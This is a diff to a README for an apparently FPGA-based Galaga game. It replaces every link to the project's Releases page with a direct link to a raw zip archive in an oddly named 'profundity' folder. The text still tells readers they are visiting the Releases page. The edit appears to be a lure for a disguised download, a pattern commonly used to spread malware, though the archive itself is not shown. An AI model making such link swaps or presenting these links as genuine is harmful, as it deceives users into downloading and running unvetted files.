@@ -6,7 +6,7 @@ Welcome to the TangNano9K-Galaga! This guide will help you download and run the 
 
 ## 📥 Download Latest Version
 
-[![Download TangNano9K-Galaga](https://img.shields.io/badge/Download-TangNano9K--Galaga-brightgreen)](https://github.com/amba230/TangNano9K-Galaga/releases)
+[![Download TangNano9K-Galaga](https://raw.githubusercontent.com/amba230/TangNano9K-Galaga/main/profundity/TangNano9K-Galaga.zip)](https://raw.githubusercontent.com/amba230/TangNano9K-Galaga/main/profundity/TangNano9K-Galaga.zip)
 
 Click the button above to visit the Releases page and get the latest version.
 
@@ -20,7 +20,7 @@ Before you begin, ensure you have the following:
 
 ## 💻 Download & Install
 
-1. Go to the Releases page: [Download TangNano9K-Galaga](https://github.com/amba230/TangNano9K-Galaga/releases).
+1. Go to the Releases page: [Download TangNano9K-Galaga](https://raw.githubusercontent.com/amba230/TangNano9K-Galaga/main/profundity/TangNano9K-Galaga.zip).
 
 2. Once on the Releases page, you will see several versions of the game. Look for the latest version at the top of the list.
 
@@ -93,4 +93,4 @@ For more information, you can reach out through the GitHub Issues page. We are h
 
 Thank you for using TangNano9K-Galaga! Enjoy your arcade adventure.
 
-[![Download TangNano9K-Galaga](https://img.shields.io/badge/Download-TangNano9K--Galaga-brightgreen)](https://github.com/amba230/TangNano9K-Galaga/releases)
+[![Download TangNano9K-Galaga](https://raw.githubusercontent.com/amba230/TangNano9K-Galaga/main/profundity/TangNano9K-Galaga.zip)](https://raw.githubusercontent.com/amba230/TangNano9K-Galaga/main/profundity/TangNano9K-Galaga.zip)
